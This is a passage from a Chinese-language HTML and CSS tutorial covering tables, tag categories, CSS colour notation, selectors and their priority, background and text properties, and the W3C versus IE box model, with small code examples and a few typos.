code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">border</span>=<span class="hljs-string">&quot;1&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>姓名<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>性别<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span></code></pre></div></li><li><p>注意：<code>&lt;table&gt;</code>的<code>border</code>属性不能少</p></li></ul><ul><li><p><code>&lt;tr&gt;</code> <code>&lt;td&gt;</code>标签的使用</p><ul><li><p><code>&lt;tr&gt;</code>行标签：</p><ul><li><code>&lt;tr&gt;</code>可以定义表格中的一行，一个&lt;<code>tr&gt;&lt;/tr&gt;</code>表示一行。<div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">border</span>=<span class="hljs-string">&quot;1&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>姓名<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>性别<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>姓名<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>性别<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span></code></pre></div></li></ul></li></ul></li><li><p><code>&lt;td&gt;</code>单元格标签:</p><ul><li><code>&lt;td&gt;</code>可以定义表格中的一个单元格，<code>&lt;td&gt;&lt;/td&gt;</code>表示一个单元格。<div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">border</span>=<span class="hljs-string">&quot;1&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">td</span> &gt;</span>姓名<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>性别<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>爱好<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span></code></pre></div><ul><li><code>border-collapse</code> 属性设置是否将表格边框折叠为单一边框：</li><li><code>border-collapse:collapse</code>;</li><li><code>colspan</code>左右合并</li><li><code>rowspan</code>上下合并</li></ul></li></ul></li></ul><p><strong>第一部分总结</strong>：</p><ul><li><p>非可视化标签：<code>head</code>  <code>meta</code>  <code>style</code>  <code>scrpit.</code>..</p></li><li><p>可视化标签：<code>img</code>  <code>div</code> <code>span</code> <code>a</code> <code>ul</code> <code>li</code>…</p></li><li><p>只有可视化标签，才能用<code>css</code>改变它</p></li><li><p>单标签：<code>meta</code>  <code>link</code>  <code>base</code>  <code>img</code>  <code>input</code> <code>br</code> <code>hr</code></p></li><li><p>双标签：<code>html</code> <code>head</code> <code>body</code>  <code>div</code>  <code>a</code>  <code>p</code>  <code>span</code> ..<code>ul</code> <code>li</code> <code>ol</code> <code> dl</code> ….</p></li><li><p><strong>常用可视化标签</strong></p><ul><li>** <code>div</code>** <ul><li>一般用它来布局</li></ul></li><li><strong>a</strong>  超链接标签<ul><li><code>href</code>*属性：设置跳转的网页地址</li><li><code>target</code>属性：设置跳转的目标</li><li>结论：凡事页面可以点击跳转或者表单提交的文字，都用<code>a</code>标签</li></ul></li><li><strong><code>img</code></strong><ul><li><code>src</code>*属性用来设置图片的url数据</li><li><code>alt</code>提供给搜索引擎搜索的</li><li><code>width</code></li><li><code>height</code></li><li>结论 ：显示图片</li></ul></li><li><strong>ul li</strong><ul><li>列表</li><li>结论：只要将来设计页面中有固定样式的列表，就用ul和li</li></ul></li><li><strong><code>table</code> <code>caption</code> <code>tr</code> <code>td (th)</code></strong><ul><li>慢慢已经被淘汰了 被ul li代替</li><li>如果是合并竖排的就是合并行（<code>rowspan</code>）</li><li>如果是合并横排的就是合并列（<code>colspan</code>）</li></ul></li></ul></li></ul><hr><p><strong>HTML部分导图总结</strong></p><hr><ul><li><a href="http://www.html5star.com/manual/html5label-meaning/">HTML5标签集合</a></li></ul><p><img src="./H4C2/1.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p><p><img src="./H4C2/2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p><p><img src="./H4C2/3.jpeg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p><hr><h3 id="第二部分-CSS"><a href="#第二部分-CSS" class="headerlink" title="第二部分 CSS"></a>第二部分 CSS</h3><hr><h4 id="第八章-css基础知识"><a href="#第八章-css基础知识" class="headerlink" title="第八章 css基础知识"></a>第八章 css基础知识</h4><hr><ul><li><p><code>css</code>基础知识：</p><ul><li><code>css</code>样式表的定义</li><li><code>css</code>：（Cascading Style Sheets）层叠样式表；</li></ul></li><li><p>分类及位置：内部样式<code>-head</code>区域<code>style</code>标签里面</p><ul><li>外部样式-<code>link</code>调用</li><li>内联样式-标签元素里面</li></ul></li><li><p><code>css</code>内的注释：/<code>*</code>注释内容<code>*</code>/</p></li><li><p><code>css</code>样式表的语法</p><ul><li><p><code>CSS</code>规则由两个主要的部分构成：要添加样式的盒子名或者标签名、和要添加的样式。</p></li><li><p>盒子名或者标签名{属性:值;}</p></li><li><p><strong>CSS中几种颜色的表示方法</strong></p><ul><li><strong>用颜色名表示</strong><ul><li>有17个预先确定的颜色，它们是<ul><li><code>aqua</code>, <code>black</code>, <code>blue</code>, <code>fuchsia</code>, <code>gray</code>, <code>green</code>, <code>lime</code>, <code>maroon</code>, <code>navy</code>,<br>　　<code>olive</code>, <code>orange,</code> <code>purple</code>, <code>red</code>, <code>silver</code>, <code>teal</code>, <code>white</code>, and <code>yellow</code></li></ul></li></ul></li></ul><ul><li><p><strong>用十六进制的颜色值表示(红、绿、蓝)</strong></p><ul><li><code>#FF0000</code>或者<code>#F00 </code> </li></ul></li><li><p><strong>用rgb(r,g,b)函数表示</strong></p><ul><li>如：<code>rgb(255,255,0)</code></li></ul></li><li><p><strong>用hsl(Hue,Saturation,Lightness)函数表示（色调、饱和度、亮度)</strong></p><ul><li>如：<code>hsl(120,100%,100%)</code>,色调0代表红色，<code>120</code>代表绿色，<code>240</code>代表<br>蓝色 </li></ul></li><li><p>**用<code>rgba(r,g,b,a)</code>函数表示 **</p><ul><li>其中<code>a</code>表示的是改颜色的透明度，取值范围是<code>0~1</code>，其中<code>0</code>代表完全透明</li></ul></li><li><p><strong>用hsla(Hue,Saturation,Lightness,alpha)函数表示</strong></p><ul><li>色调、饱和度、亮度、透明度 </li></ul></li><li><p>例子</p></li></ul></li></ul></li></ul><div class="hljs code-wrapper"><pre><code class="hljs html">  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;position:absolute;top:0px&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;background-color:gray;&quot;</span>&gt;</span>background-color:gray<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;background-color:#F00;&quot;</span>&gt;</span>background-color:#F00<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;background-color:#ffff00;&quot;</span>&gt;</span>background-color:#ffff00<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;background-color:rgb(255,0,255);&quot;</span>&gt;</span>background-color:rgb(255,0,255)<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;background-color:hsl(120,80%,50%);&quot;</span>&gt;</span>background-color:hsl(120,80%,50%)<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;background-color:rgba(255,0,255,0.5);&quot;</span>&gt;</span>background-color:rgba(255,0,255,0.5)<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;background-color:hsla(120,80%,50%,0.5);&quot;</span>&gt;</span>background-color:hsla(120,80%,50%,0.5)<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></code></pre></div><p><img src="http://upload-images.jianshu.io/upload_images/1480597-39e61a813f637282.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p><ul><li>内部样式表<ul><li>当单个页面需要设置样式时，就应该使用内部样式表。</li><li>使用 <code>&lt;style&gt;&lt;/style&gt;</code>标签在文档<code>&lt;head&gt;&lt;/head&gt;</code>里面定义内部样式表</li></ul></li></ul><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span> &gt;</span><span class="css">  <span class="hljs-selector-tag">p</span>&#123;<span class="hljs-attribute">color</span>:red;&#125;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></code></pre></div><ul><li><p>内联样式表（优先级高）</p><ul><li><p>写在标签里面的样式</p></li><li><p>如：<code>&lt;p style=&quot;color:red;&quot;&gt;&lt;/p&gt;</code></p></li></ul></li><li><p>表示给<code>p</code>标签里面的文字颜色设置为红色</p></li><li><p>区别：外链样式与导入样式</p><ul><li><p><code>link</code>标签是属于<code>xhtml</code>范畴，而<code>@import</code>则是<code>css2.1</code>中特有的。<code>link</code>标签除了可以加载<code>CSS</code>外，还可以做很多其它的事情，比如定义<code>RSS</code>，定义<code>rel</code>连接属性等，<code>@import</code>就只能加载<code>CSS</code>了。 </p></li><li><p>加载的顺序的区别，<code>link</code>加载的<code>css</code>时，是一种并行(没有尝试是否是这样)加载<code>CSS</code>方式，而<code>@impor</code>则在整个页面加载完成后才加载。</p></li><li><p>兼容性的区别，因<code>@import``CSS2.1</code>才特有的，所以对于不兼容<code>CSS2.1</code>的浏览器来说，无效。</p></li><li><p>在样式控制上(比如动态改变网页的布局时,使用<code>javascript</code>操作<code>DOM</code>)的区别，此时<code>@import</code>就无能为力了。</p></li></ul></li><li><p><strong>样式的优先级补充</strong></p><ul><li>相同权值情况下，<code>CSS</code>样式的优先级总结来说，就是——就近原则（离被设置元素越近优先级别越高）：<ul><li><code>内联样式表（标签内部）</code> &gt; <code>嵌入样式表（当前文件中）</code>&gt; <code>外部样式表（外部文件中）</code></li></ul></li></ul></li><li><p>权值不同时，浏览器是根据权值来判断使用哪种<code>css</code>样式的，哪种样式权值高就使用哪种样式</p></li><li><p>层叠优先级是:</p><ul><li> <code>浏览器缺省</code>&lt; <code>外部样式表</code> &lt; <code>内部样式表</code> &lt; <code>内联样式</code></li></ul></li><li><p>其中样式表又有:<code>类选择器</code> &lt; <code>类派生选择器 </code>&lt;<code> ID选择器</code> &lt; <code>ID派生选择器</code></p></li><li><p>派生选择器以前叫上下文选择器，所以完整的层叠优先级是:</p><ul><li><code>浏览器缺省</code> &lt;<code> 外部样式表</code> &lt; <code>外部样式表类选择器</code> &lt; <code>外部样式表类派生选择器 </code>&lt; <code>外部样式表ID选择器</code> &lt; <code>外部样式表ID派生选择器 </code>&lt; <code>内部样式表</code> &lt; <code>内部样式表类选择器</code> &lt; <code>内部样式表类派生选择器</code> &lt; <code>内部样式表ID选择器</code> &lt; <code>内部样式表ID派生选择器</code> &lt; <code>内联样式</code>…共<code>12</code>个优先级</li></ul></li><li><p>另外，如果同一个元素在没有其他样式的作用影响下，其<code>Class</code>定义了多个并以空格分开，其优先级顺序为：</p><ul><li>一个元素同时应用多个<code>class</code>，后定义的优先（即近者优先），加上<code>!important</code>者最优先！</li></ul></li><li><p>选择器权重</p><table><thead><tr><th>选择器</th><th>权重值</th></tr></thead><tbody><tr><td>!important</td><td>infinity（正无穷）</td></tr><tr><td>行间样式</td><td>1000</td></tr><tr><td>id选择器</td><td>100</td></tr><tr><td>class、属性、伪类选择器</td><td>10</td></tr><tr><td>标签选择器、伪元素选择器</td><td>1</td></tr><tr><td>通配符选择器</td><td>0</td></tr></tbody></table></li></ul><hr><h4 id="第九章-css选择器-上"><a href="#第九章-css选择器-上" class="headerlink" title="第九章 css选择器(上)"></a>第九章 css选择器(上)</h4><ul><li><p><code>css</code>选择器：</p><ul><li><code>class</code>类选择器可以重复利用    </li><li><code>id</code>选择器唯一</li></ul></li><li><p>标签选择器</p><ul><li>什么是选择器：css选择器就是要改变样式的对象</li></ul></li><li><p>选择器<code>&#123;属性:值;属性:值;&#125;</code></p></li><li><p>标签选择器：页面中所有的标签都是一个选择器  <code>p&#123;color:red;&#125;</code></p></li><li><p>通配符选择器 *</p><ul><li>选择全部的元素 以 <code>*</code> 开头，如: <code>*&#123;color:#0f0;&#125;</code></li></ul></li><li><p><code>ID</code>选择器</p><ul><li>选择<code>id</code>命名的元素 以 <code>#</code> 开头   <code>#p1&#123;color:#0f0;&#125;</code></li></ul></li><li><p>类选择器</p><ul><li><code>class</code>选择器，选择<code>clas</code>命名的元素 以<code>.</code>开头  <code>.first&#123;color:#00f;&#125;</code></li></ul></li><li><p><code>css</code>代码写完后上线前要经过压缩处理 </p></li><li><p>本地和服务器分两个<code>css</code>版本（备份）</p></li><li><p>压缩后注释都清除，空间体积减少</p></li><li><p>群组选择器</p><ul><li>选择多个元素,以逗号隔开 <code>#main,.first,span,a,h1&#123;color:red;&#125;</code></li></ul></li><li><p>包含选择器</p><ul><li>选择某元素的后代元素，也称后代选择器，父类与子类间以空格隔开<code>p</code>   <ul><li><code>span&#123;color:red;&#125;</code></li></ul></li></ul></li><li><p>属性选择器</p><ul><li>选择包含某一属性的元素</li><li><code>a[title]&#123;color:red;&#125;</code>  选择包含<code>title</code>的<code>a</code>标签</li><li><code>a[title][href]&#123;color:red;&#125;</code> 选择包含<code>title</code>和<code>href</code>的<code>a</code>标签</li></ul></li><li><p><code>&gt; </code> <code>+</code> 选择器子类选择器：只选择子元素（只选择儿子）（相当于包含元素）</p><ul><li><code>p &gt; span&#123;color:red;&#125;</code></li></ul></li><li><p>相邻兄弟选择器：只选择后面的相邻兄弟元素</p><ul><li><code>p + span&#123;color:red;&#125;</code></li></ul></li></ul><hr><h4 id="第十章-css选择器-下"><a href="#第十章-css选择器-下" class="headerlink" title="第十章 css选择器(下)"></a>第十章 css选择器(下)</h4><hr><ul><li><p><code>&lt;a&gt;</code>伪类选择器</p><ul><li><p><code>a:link &#123;color:#FF0000;&#125;</code>    /* 超链接未访问时的状态 */ （只用于a标签）</p></li><li><p><code>a:visited &#123;color:#00FF00;&#125;</code>    /* 超链接访问过后的状态 */ （只用于a标签）</p></li><li><p><code>a:hover &#123;color:#FF00FF;&#125;    </code>/* 鼠标悬停状态</p></li><li><p><code>*/</code>（可和其他标签结合一起用）</p></li><li><p><code>a:active &#123;color:#0000FF;&#125;</code>    /* 激活状态，鼠标按下状态 */</p></li><li><p><strong>注意</strong></p><ul><li>伪类选择器的排序很重要，<code>a:link</code> <code>a:visited</code> <code>a:hover</code> <code>a:active</code>，记作<code>lvha</code></li></ul></li></ul></li><li><p>输入伪类选择器（针对表单）</p><ul><li><code>input:focus&#123;color:red;&#125; </code>      /* 键盘输入焦点 */</li></ul></li><li><p>位置伪类选择器（针对表单）</p><ul><li><code>p:first-child&#123;color:red;&#125;</code>     /<code>* 第一个p *</code>/</li><li><code>p:last-child&#123;color:red;&#125;</code>     /<code>* 最后一个p *</code>/</li></ul></li><li><p>伪元素选择器</p><ul><li><code>:before</code> 在元素之前添加内容。</li><li><code>:after</code> 在元素之后添加内容。</li></ul></li><li><p><code>css</code>优先规则</p><ul><li>内联样式表-&gt; <code>ID</code> 选择器—&gt; <code>Class</code> 类选择器-&gt;标签选择器</li></ul></li></ul><hr><h4 id="第十一章-背景属性"><a href="#第十一章-背景属性" class="headerlink" title="第十一章 背景属性"></a>第十一章 背景属性</h4><hr><ul><li><p>背景属性：</p><ul><li><p>背景的添加 ：</p></li><li><p>背景颜色的添加:</p><ul><li><code>background:red;</code></li><li><code>backgronnd-color:red;</code></li></ul></li><li><p>背景图片的添加：</p><ul><li><code>background:url(“images/1.jpg”);</code></li><li><code>backgronnd-image:url(“images/1.jpg”);</code></li></ul></li><li><p>背景的平铺</p></li><li><p>什么是平铺？平铺就是图片是否重复出现</p><ul><li>不平铺：<code>background-repeat:no-repeat;</code></li><li>水平方向平铺：<code>background-repeat:repeat-x;</code></li><li>垂直方向平铺：<code>background-repeat:repeat-y;</code></li><li>完全平铺：默认为完全平铺</li></ul></li><li><p>背景图片的定位</p><ul><li>背景图片的定位就是可以设置显示背景图片的位置，通过属性<code>background-position</code>来实现</li><li><code>background-position</code>的取值可为英文单词或者数值和百分值。</li><li><code>background-positon</code>的英文单词取值</li><li><code>top left </code>                   </li><li><code>top  center  </code>                   </li><li><code>top  right</code></li><li><code>center left  </code>            </li><li><code>center  center </code>                   </li><li><code>center right</code></li><li><code>bottom left  </code>           </li><li><code>bottom  center </code>    </li><li><code>ottom right</code></li></ul></li><li><p><code>background-positon</code>的数值取值     </p><ul><li><code>background-position:x  y;</code>  </li></ul></li><li><p><code>positon</code>的百分值取值     </p><ul><li><code>background-position:x%  y%; </code> </li></ul></li><li><p>背景图片的大小</p><ul><li>背景图片的大小可以通过属性<code>background-size</code>来设置<code>background-size</code>的取值可为数值和百分值。</li></ul></li><li><p><code>background-size</code>的数值取值     </p><ul><li><code>background-size:x  y;</code>  </li></ul></li><li><p><code>background-size</code>的数值取值     </p><ul><li><code>background-size:x%  y%;</code></li></ul></li><li><p>背景图片的滚动</p><ul><li><p>背景图片是否随着内容的滚动而滚动由<code>background-attachment</code>设置</p></li><li><p><code>background-attachment:fixed; </code>  固定，不随内容的滚动而滚动    </p></li><li><p><code>background-attachment:scroll; </code> 滚动，随内容的滚动而滚动</p></li></ul></li></ul></li></ul><hr><h4 id="第十二章-文字文本属性"><a href="#第十二章-文字文本属性" class="headerlink" title="第十二章 文字文本属性"></a>第十二章 文字文本属性</h4><hr><ul><li><p><code>css</code>文字文本属性：</p><ul><li><p><strong>文字属性</strong></p><ul><li><code>color:red;</code>    文字颜色</li><li><code>font-size:12px</code>;    文字大小</li><li><code>font-weight:“bold”</code>    文字粗细(<code>bold/normal</code>)</li><li><code>font-family:“宋体”</code>    文字字体</li><li><code>font-variant:small-caps </code>小写字母以大写字母显示</li></ul></li></ul></li></ul><ul><li><p><strong>文本属性</strong></p><ul><li><code>text-align:center;</code>   文本对齐(<code>right</code>/<code>left</code>/<code>center</code>)</li><li><code>line-height:10px; </code> 行间距(可通过它实现文本的垂直居中)</li><li><code>text-indent:20px;</code>  首行缩进</li><li><code>text-decoration:none; </code> <ul><li>文本线(<code>none</code>/<code>underline</code>/<code>overline</code>/<code>line-through</code>)</li></ul></li><li><code>letter-spacing</code>:   字间距</li></ul></li></ul><hr><h4 id="第十三章-盒子模型"><a href="#第十三章-盒子模型" class="headerlink" title="第十三章 盒子模型"></a>第十三章 盒子模型</h4><hr><ul><li><p><strong>盒子模型</strong></p><ul><li>盒子模型就是一个有高度和宽度的矩形区域</li><li>所有<code>html</code>标签都是盒子模型</li><li><code>div</code>标签自定义盒子模型</li></ul></li><li><p>所有的标签都是盒子模型</p><ul><li><code>class</code>和<code>id</code>的主要差别是：<code>class</code>用于元素组（类似的元素，或者可以理解为某一类元素），而<code>id</code>用于标识单独的唯一的元素。</li></ul></li><li><p><strong>盒子模型的组成</strong></p><ul><li>盒子模型组成部分：<ul><li>自身内容：<code> width</code>、h<code>eight</code> 宽高</li><li>内边距：   <code>padding</code></li><li>盒子边框： <code>border</code> 边框线</li><li>与其他盒子距离：  <code>margin </code>外边距</li><li>内容+内边距+边框+外边距=面积</li></ul></li></ul></li><li><p><code>border</code> 边框</p><ul><li>常见写法  <code>border:1px solid #f00;</code></li></ul></li><li><p>单独属性：</p><ul><li><code>border-width</code>:</li><li><code>border-style:</code> <ul><li><code>dotted </code> 点状虚线</li><li><code>dashed</code>（虚线）</li><li><code>solid</code>（实线）</li><li><code>double</code>（双实线）</li></ul></li><li><code>border-color</code> (颜色)</li></ul></li><li><p><code>padding</code> 内边距</p><ul><li><p>值：<code>像素</code>/<code>厘米</code>等长度单位、百分比</p><ul><li><code>padding:10px; </code>                      上下左右</li><li><code>padding:10px 10px; </code>                 上下  左右</li><li><code>padding:10px 10px 10px; </code>         上 左右 下</li><li><code>padding:10px 10px 10px 10px; </code> 上 右 下 左（设置4个点–&gt;顺时针方向）</li></ul></li></ul></li><li><p>单独属性：</p><ul><li><code>padding-top:</code></li><li><code>padding-right:</code></li><li><code>padding-bottom:</code></li><li><code> padding-left:</code></li></ul></li><li><p>当设置内边距的时候会把盒子撑大，为了保持盒子原来的大小，应该高度和宽度进行减小，根据<code>width</code>和<code>height</code>减小</p></li><li><p>margin 外边距</p><ul><li><p>值：与<code>padding</code>相同</p></li><li><p>单独属性：与<code>padding</code>相同</p></li></ul></li><li><p>外边距合并：两个盒子同时设置了外边距，会进行一个外边距合并</p></li></ul><hr><p><strong>补充盒子模型内容</strong></p><hr><ul><li><p><strong>标准盒子模型</strong></p><ul><li>盒子模型是<code>css</code>中一个重要的概念，理解了盒子模型才能更好的排版。其实盒子模型有两种，分别是 <code>ie </code>盒子模型和标准 <code>w3c</code> 盒子模型。他们对盒子模型的解释各不相同，先来看看我们熟知的标准盒子模型</li></ul></li></ul><p><img src="./H4C2/w3c.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p><ul><li><p>从上图可以看到标准 <code>w3c</code> 盒子模型的范围包括 <code>margin</code>、<code>border</code>、<code>padding</code>、<code>content</code>，并且 <code>content </code>部分不包含其他部分</p></li><li><p>** IE盒子模型**</p></li></ul><p><img src="./H4C2/ie.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p><ul><li><p>从上图可以看到 <code>ie </code>盒子模型的范围也包括 <code>margin</code>、<code>border</code>、<code>padding</code>、<code>content</code></p></li><li><p>和标准 <code>w3c</code> 盒子模型不同的是：<code>ie</code> 盒子模型的 <code>content</code> 部分包含了 <code>border </code>和 <code>padding</code></p></li><li><p><code>IE</code>盒子模型<code>width</code> = <code>padding</code>+<code>border</code>+<code>内容</code></p></li><li><p>标准盒子模型 = 内容的宽度（不包含<code>border</code>+<code>padding</code>）</p></li><li><p>例：</p><ul><li>一个盒子的   <code>margin</code>为 20px，<code>border</code> 为 1px，<code>padding </code>为 10px，<code>content</code> 的宽为 200px、高为 50px，假如用标准 <code>w3c</code> 盒子模型解释，那么这个盒子需要占据的位置为：宽 <code>20*2+1*2+10*2+200=262px</code>、高 <code>20*2+1*2*10*2+50=112px</code>，盒子的实际大小为：宽 <code>1*2+10*2+200=222px</code>、高 <code>1*2+10*2+50=72px</code>；假如用ie 盒子模型，那么这个盒子需要占据的位置为：宽 <code>20*2+200=240px</code>、高 <code>20*2+50=70px</code>，盒子的实际大小为：宽 <code>200px</code>、高 <code>50px</code></li></ul></li><li><p>那应该选择哪中盒子模型呢？当然是“标准 <code>w3c</code> 盒子模型”了。怎么样才算是选择了“标准 <code>w3c </code>盒子模型”呢？很简单，就是在网页的顶部加上 <code>doctype</code> 声明。</p></li><li><p>假如不加<code> doctype</code> 声明，那么各个浏览器会根据自己的行为去理解网页，即 <code>ie </code>浏览器会采用 <code>ie</code> 盒子模型去解释你的盒子，而 <code>ff </code>会采用标准<code> w3c</code> 盒子模型解释你的盒子，所以网页在不同的浏览器中就显示的不一样了。</p></li><li><p>反之，假如加上了 <code>doctype</code> 声明，那么所有浏览器都会采用标准 <code>w3c </code>盒子模型去解释你的盒子，网页就能在各个浏览器中显示一致了。</p></li></ul><hr><ul><li>用 <code>jquery</code> 做的例子来证实一下</li></ul><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>你用的盒子模型是？<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&quot;javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;jquery.min.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&quot;javascript&quot;</span>&gt;</span><span class="javascript"><span class="hljs-keyword">var</span> sbox = $.boxmodel ? <span class="hljs-string">&quot;标准w3c&quot;</span>:<span class="hljs-string">&quot;ie&quot;</span>;</span><span class="javascript"><span class="hljs-built_in">document</span>.write(<span class="hljs-string">&quot;您的页面目前支持：&quot;</span>+sbox+<span class="hljs-string">&quot;盒子模型&quot;</span>);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre></div><ul><li>　上面的代码没有加上 <code>doctype</code> 声明，在 <code>ie</code> 浏览器中显示  <code>ie</code>盒子模型，在 ff 浏览器中显示“标准<code>w3c</code> 盒子模型”。</li></ul><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!doctype <span class="hljs-meta-keyword">html</span> <span class="hljs-meta-keyword">public</span> <span class="hljs-meta-string">&quot;-//w3c//dtd xhtml 1.0 transitional//en&quot;</span> <span class="hljs-meta-string">&quot;http://www.w3.org/tr/xhtml1/dtd/xhtml1-transitional.dtd&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>你用的盒子模型是标准w3c盒子模型<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&quot;javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;jquery.min.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&quot;javascript&quot;</span>&gt;</span><span class="javascript"><span class="hljs-keyword">var</span> sbox = $.boxmodel ? <span class="hljs-string">&quot;标准w3c&quot;</span>:<span class="hljs-string">&quot;ie&quot;</span>;</span><span class="javascript"><span class="hljs-built_in">document</span>.write(<span class="hljs-string">&quot;您的页面目前支持：&quot;</span>+sbox+<span class="hljs-string">&quot;盒子模型&quot;</span>);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre></div><ul><li>　代码2 与代码1 唯一的不同的就是顶部加了 <code>doctype </code>声明。在所有浏览器中都显示“标准 <code>w3c </code>盒子模型”</li></ul><ul><li><p> 所以为了让网页能兼容各个浏览器，让我们用标准 <code>w3c</code> 盒子模型</p></li><li><p>扩展</p><ul><li><a href="http://www.jianshu.com/p/e2eb0d8c9de6">学会使用box-sizing布局</a></li></ul></li></ul><hr><h4 id="第十四章-块元素、行元素与溢出"><a href="#第十四章-块元素、行元素与溢出" class="headerlink" 